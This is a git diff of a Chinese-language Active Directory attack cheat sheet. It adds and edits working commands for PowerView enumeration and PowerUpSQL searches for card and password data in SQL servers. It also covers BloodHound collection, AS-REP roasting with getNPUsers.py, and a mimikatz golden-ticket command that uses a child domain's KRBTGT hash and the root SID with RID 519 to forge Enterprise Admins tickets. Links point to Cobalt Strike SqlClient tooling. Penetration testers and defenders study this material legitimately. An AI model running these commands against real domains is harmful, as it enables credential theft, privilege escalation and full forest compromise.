@@ -69,7 +69,8 @@ wmic /node: COMPUTER_NAME share get
 net group "Domain Computers" /domain | findstr "FILE"
 ```
 
-- powerview
+- powerview  
+[Cheat sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 ```cpp
 Find-DomainShare
 Get-DomainFileServer
@@ -129,6 +130,11 @@ $Accessible | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keywor
 Get-SQLColumnSampleData –Verbose –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults  –Instance "Server1\Instance1"
 
 ```
+
+- SqlClient in cobaltstrike(also use in lateral movement)  
+[sqlclient in github](https://github.com/FortyNorthSecurity/SqlClient)
+![image](https://user-images.githubusercontent.com/30458572/116821806-ee431e00-abad-11eb-8808-76ba273195a3.png)
+
 ### 定位用户
 ```cpp
 # Find where a specific user is logged in using Powerview:
@@ -231,7 +237,7 @@ Set-ExecutionPolicy Bypass ./ADAPE.ps1 -All
 ## [BloodHound](https://github.com/BloodHoundAD/BloodHound)使用
 
 
-一键搜集信息,适合小域
+一键搜集信息
 [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
 ```cpp
 Import-Module .\SharpHound.ps1
@@ -243,6 +249,8 @@ Invoke-Bloodhound -Verbose -Domain 'domain.local' -DomainController 'DC01.domain
 [https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
 [https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/F%20-%20BloodHound](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/F%20-%20BloodHound)
 
+- Using BloodHound without collectors (ldapsearch stuff)  
+[Using Bloodhound in Linux environments](https://www.errno.fr/BloodhoundForLinux.html)
 
 ## SPN扫描到Kerberoasting
 
@@ -440,7 +448,7 @@ kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805
 
 
 
-如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。
+如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限[RID=519]（域林中的最高权限）的票据。
 
 
 然后通过mimikatz重新生成包含根域SID的新的金票
@@ -448,7 +456,8 @@ Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票�
 
 
 ```
-kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt
+Step 1. 获取根域的sid(powerview module): Convert-NameToSid uknowsec.cn\krbtgt 
+Step 2. kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX(Child-DomainSid) /sids:XXX-519(填入刚刚获取到的根域SID, RID=519为Enterprise Admins组) /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt
 ```
 
 
@@ -877,7 +886,10 @@ psexec.py rootkit.org/administrator@SRV-WEB-KIT.rootkit.org -k -no-pass
 ```go
 powerpick Get-DomainUser -PreauthNotRequired
 ```
-
+- Use with impacket script
+```go
+getNPUsers.py
+```
 
 存在的话.利用rubeus自动生成离线hash
 ```go
